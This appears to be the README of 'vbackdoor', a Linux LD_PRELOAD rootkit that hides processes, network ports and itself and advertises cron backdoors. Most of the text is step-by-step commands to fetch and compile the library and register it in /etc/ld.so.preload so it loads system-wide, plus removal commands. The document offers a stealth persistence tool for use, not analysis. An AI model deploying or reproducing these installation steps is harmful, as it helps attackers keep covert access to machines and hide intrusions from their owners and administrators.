# vbackdoor
[中文](https://github.com/veo/vbackdoor/blob/main/README_cn.md)

Hide process,port,self under Linux using the LD_PRELOAD rootkit.

### Compile the library

```
git clone https://github.com/veo/vbackdoor.git
cd vbackdoor
vi vbackdoor.c
make
sudo mv vbackdoor.so /usr/local/lib/
```

or

```
wget https://raw.githubusercontent.com/veo/vbackdoor/main/vbackdoor.c
vi vbackdoor.c
gcc -Wall -fPIC -shared -o vbackdoor.so vbackdoor.c -ldl
sudo mv vbackdoor.so /usr/local/lib/
```

### Load it with the global dynamic linker

```
echo /usr/local/lib/vbackdoor.so >> /etc/ld.so.preload
```

### Remove

```
vi /etc/ld.so.preload
```

and delete string "/usr/local/lib/vbackdoor.so"


or


use busybox
```
rm -rf /etc/ld.so.preload
```

  * Process hiding
  * LD_PRELOAD hiding
  * Network hiding
  * cron Backdoors
